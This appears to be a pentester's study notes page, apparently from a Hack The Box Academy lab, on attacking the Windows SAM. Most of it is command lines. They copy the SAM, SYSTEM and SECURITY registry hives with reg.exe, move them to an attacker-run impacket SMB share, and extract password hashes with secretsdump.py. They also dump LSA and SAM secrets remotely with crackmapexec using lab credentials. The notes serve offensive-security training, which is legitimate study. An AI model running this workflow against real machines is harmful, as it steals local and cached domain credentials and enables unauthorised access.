---
description: helpful when we have base shell/local shell creds
---

# Attacking SAM

### Copying SAM registry hives

<table><thead><tr><th width="233">Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td>hklm\sam</td><td>local password in hashes</td></tr><tr><td>hklm\system</td><td>system bootkey, which helps to encrypt SAM database</td></tr><tr><td>hklm\security</td><td>cached creds from domain. benefit in domain system</td></tr></tbody></table>

### Using reg.exe save to Copy Registry Hives&#x20;

```
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

![[images/image 1.png]]


## Creating share with smbserver


```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support ROPNOP .
```


Now, after after copying HIves with reg.exe, go to C drive and move to smb share

![[image 1 1.png]]
C drive


### Dumping Hashes with Impacket's secretsdump.py

secretsdump dumps the local SAM hashes&#x20;

and also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security.&#x20;

first step secretsdump executes is targeting the system bootkey. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section.


```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


![[images/image 2.png]]

## Remote Dumping SAM & LSA Secrets

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

![[images/image 3.png]]

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

![[images/image 4.png]]

**LSA:** can be more helpful with many purposes as we can do network auth if PC is connected with domain

**SAM:** useful to gain local user creds as it stores local passwords
